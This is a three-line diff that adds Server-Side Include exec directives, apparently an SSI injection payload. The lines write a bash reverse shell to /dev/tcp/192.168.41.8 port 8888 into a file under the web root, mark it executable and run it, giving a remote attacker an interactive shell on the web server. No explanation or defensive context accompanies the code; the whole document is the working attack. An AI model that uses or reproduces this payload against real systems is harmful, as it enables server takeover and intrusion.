@@ -1,0 +1,3 @@
+<!--#exec cmd="echo 'bash -i >& /dev/tcp/192.168.41.8/8888 0>&1' > /var/www/html/shell.sh"-->
+<!--#exec cmd="chmod +x /var/www/html/shell.sh"-->
+<!--#exec cmd="/bin/bash /var/www/html/shell.sh"-->
